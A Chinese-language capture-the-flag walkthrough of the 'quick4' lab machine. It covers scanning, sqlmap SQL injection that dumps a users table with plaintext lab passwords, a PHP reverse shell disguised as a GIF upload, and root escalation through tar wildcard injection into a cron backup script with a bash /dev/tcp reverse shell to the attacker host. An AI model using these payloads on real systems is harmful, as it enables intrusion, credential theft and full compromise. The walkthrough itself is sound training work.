
信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-15 03:19 EDT

Nmap scan report for quick4 (192.168.2.9)
Host is up (0.00028s latency).
MAC Address: 08:00:27:AA:84:13 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 43.54 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.9
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-15 03:21 EDT
Nmap scan report for quick4 (192.168.2.9)
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 08:00:27:AA:84:13 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.10 seconds
```

漏洞利用

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git -u http://192.168.2.9
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,jpg,png,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://192.168.2.9/images/]                                                          
/index.html           (Status: 200) [Size: 51414]
/.html                (Status: 403) [Size: 276]
/img                  (Status: 301) [Size: 308] [--> http://192.168.2.9/img/]                                                             
/modules              (Status: 301) [Size: 312] [--> http://192.168.2.9/modules/]                                                         
/careers              (Status: 301) [Size: 312] [--> http://192.168.2.9/careers/]                                                         
/css                  (Status: 301) [Size: 308] [--> http://192.168.2.9/css/]                                                             
/lib                  (Status: 301) [Size: 308] [--> http://192.168.2.9/lib/]                                                             
/js                   (Status: 301) [Size: 307] [--> http://192.168.2.9/js/]                                                              
/customer             (Status: 301) [Size: 313] [--> http://192.168.2.9/customer/]                                                        
/404.html             (Status: 200) [Size: 5014]
/robots.txt           (Status: 200) [Size: 32]
/fonts                (Status: 301) [Size: 310] [--> http://192.168.2.9/fonts/]                                                           
/employee             (Status: 301) [Size: 313] [--> http://192.168.2.9/employee/]                                                        
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 276]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

看一下/robots.txt

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.9/robots.txt
User-agent: *
Disallow: /admin/
```

/admin是404，/employee得到一个登陆页面

<img width="684" height="575" alt="图片" src="https://github.com/user-attachments/assets/366b9397-552b-41b1-9ebe-252ac644fe16" />

尝试一下SQL注入

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql --batch --dbs
available databases [5]:
[*] `quick`
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql --batch -D quick --tables
Database: quick
[2 tables]
+-------+
| cars  |
| users |
+-------+
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql --batch -D quick -T cars --dump
Database: quick
Table: cars
[4 entries]
+----+---------+-------+---------+--------+---------------+
| id | user_id | brand | type    | year   | license_plate |
+----+---------+-------+---------+--------+---------------+
| 1  | 4       | Ford  | Mustang | 1963   | ABC123        |
| 2  | 6       | Honda | Civic   | 2012   | DEF456        |
| 3  | 7       | Mazda | mx5     | 2004   | GHIJ56        |
| 4  | 8       | Dodge | RAM1000 | 2020   | KLM789        |
+----+---------+-------+---------+--------+---------------+
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql -D quick -T users --columns --batch
Database: quick
Table: users
[6 columns]
+-----------------+-------------------------------------+
| Column          | Type                                |
+-----------------+-------------------------------------+
| name            | varchar(255)                        |
| role            | enum('admin','employee','customer') |
| email           | varchar(255)                        |
| id              | int                                 |
| password        | varchar(255)                        |
| profile_picture | varchar(255)                        |
+-----------------+-------------------------------------+
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql -D quick -T users -C email,password,role --dump --threads=10 --batch
Database: quick
Table: users
[28 entries]
+-----------------------------------+----------+--------------------+
| email                             | role     | password           |
+-----------------------------------+----------+--------------------+
| a.lucky@email.hmv                 | customer | c1P35bcdw0mF3ExJXG |
| andrew.speed@quick.hmv            | employee | o30VfVgts73ibSboUP |
| b.clintwood@email.hmv             | customer | 2yLw53N0m08OhFyBXx |
| coos.busters@quick.hmv            | employee | f1CD3u3XVo0uXumGah |
| d.trumpet@email.hmv               | customer | f64KBw7cGvu1BkVwcb |
| dick_swett@email.hmv              | customer | y6KA4378EbK0ePv5XN |
| frank@email.hmv                   | customer | 155HseB7sQzIpE2dIG |
| fred.flinstone@email.hmv          | customer | qM51130xeGHHxKZWqk |
| info@quick.hmv                    | admin    | Qe62W064sgRTdxAEpr |
| j.bond@email.hmv                  | customer | 7wS93MQPiVQUkqfQ5T |
| j.daniels@email.hmv               | customer | yF891teFhjhj0Rg7ds |
| j.doe@email.hmv                   | customer | 0i3a8KyWS2IcbmqF02 |
| jack.black@email.hmv              | customer | 1Wd35lRnAKMGMEwcsX |
| jane_smith@email.hmv              | customer | pL2a92Po2ykXytzX7y |
| jeff.anderson@quick.hmv           | employee | 5dX3g8hnKo7AFNHXTV |
| john.smith@quick.hmv              | employee | 5Wqio90BLd7i4oBMXJ |
| juan.mecanico@quick.hmv           | employee | 5a34pXYDAOUMZCoPrg |
| k.ball@email.hmv                  | customer | k1TI68MmYu8uQHhfS1 |
| lara.johnson@quick.hmv            | employee | 5Y7zypv8tl9N7TeCFp |
| laura.johnson@email.hmv           | customer | 95T3OmjOV3gublmR7Z |
| lee.ka-shingn@quick.hmv@quick.hmv | employee | am636X6Rh1u6S8WNr4 |
| m.monroe@email.hmv                | customer | f64KBw7cGvu1BkVwcb |
| mike.cooper@quick.hmv             | employee | Rh978db3URen64yaPP |
| misty.cupp@email.hmv              | customer | c1P35bcdw0mF3ExJXG |
| n.down@email.hmv                  | customer | Lj9Wr562vqNuLlkTr0 |
| nick.greenhorn@quick.hmv          | employee | C3ho049g4kwxTxuSUA |
| s.hutson@email.hmv                | customer | sF217VruHNj6wbjofU |
| t.green@email.hmv                 | customer | 7zQ19L0HhFsivH3zFi |
+-----------------------------------+----------+--------------------+
```

用admin权限账号info@quick.hmv，成功登录进后台，发现可以上传头像文件

<img width="773" height="280" alt="图片" src="https://github.com/user-attachments/assets/6ae040b3-becc-46f2-9019-c1f8dd0e123c" />

尝试上传一个反弹shell

```
<?php
$sock=fsockopen("192.168.2.15",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

抓包以后在前面添加一个GIF8;，伪装成图片

```
GIF8;

<?php
$sock=fsockopen("192.168.2.15",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

它是上传到了nick用户，我们切换过去

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.9] 49508
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

权限提升

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@quick4:/var/www/html/employee/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@quick4:/var/www/html/employee/uploads$ sudo -l
sudo -l
[sudo] password for www-data: 

www-data@quick4:/var/www/html/employee$ find / -perm -4000 -type f 2>/dev/null
<ml/employee$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/snapd/20671/usr/lib/snapd/snap-confine
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/core20/2105/usr/bin/chfn
/snap/core20/2105/usr/bin/chsh
/snap/core20/2105/usr/bin/gpasswd
/snap/core20/2105/usr/bin/mount
/snap/core20/2105/usr/bin/newgrp
/snap/core20/2105/usr/bin/passwd
/snap/core20/2105/usr/bin/su
/snap/core20/2105/usr/bin/sudo
/snap/core20/2105/usr/bin/umount
/snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2105/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
www-data@quick4:/var/www/html/employee$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/snap/core20/1974/usr/bin/ping cap_net_raw=ep
/snap/core20/2105/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
//发现每分钟执行一次/usr/local/bin/backup.sh
www-data@quick4:/var/www/html/employee$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*/1 *   * * *   root    /usr/local/bin/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

www-data@quick4:/var/www/html/employee$ ls -la /usr/local/bin/backup.sh
ls -la /usr/local/bin/backup.sh
-rwxr--r-- 1 root root 75 Feb 12  2024 /usr/local/bin/backup.sh
//tar使用通配符，文件名被当成tar参数解析
www-data@quick4:/var/www/html/employee$ cat /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh
#!/bin/bash
cd /var/www/html/
tar czf /var/backups/backup-website.tar.gz *
www-data@quick4:/var/www/html/employee$ cd /var/www/html/
cd /var/www/html/
//创建恶意文件
www-data@quick4:/var/www/html$ touch -- "--checkpoint=1"
touch -- "--checkpoint=1"
www-data@quick4:/var/www/html$ touch -- "--checkpoint-action=exec=bash shell.sh"
<$ touch -- "--checkpoint-action=exec=bash shell.sh"
//写入反弹shell
www-data@quick4:/var/www/html$ echo "bash -i >& /dev/tcp/192.168.2.15/1234 0>&1" > shell.sh
<h -i >& /dev/tcp/192.168.2.15/1234 0>&1" > shell.sh
www-data@quick4:/var/www/html$ chmod +x shell.sh
chmod +x shell.sh
//执行时会变为tar czf ... --checkpoint=1 --checkpoint-action=exec=bash shell.sh *
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.9] 33590
bash: cannot set terminal process group (61796): Inappropriate ioctl for device
bash: no job control in this shell
root@quick4:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
```
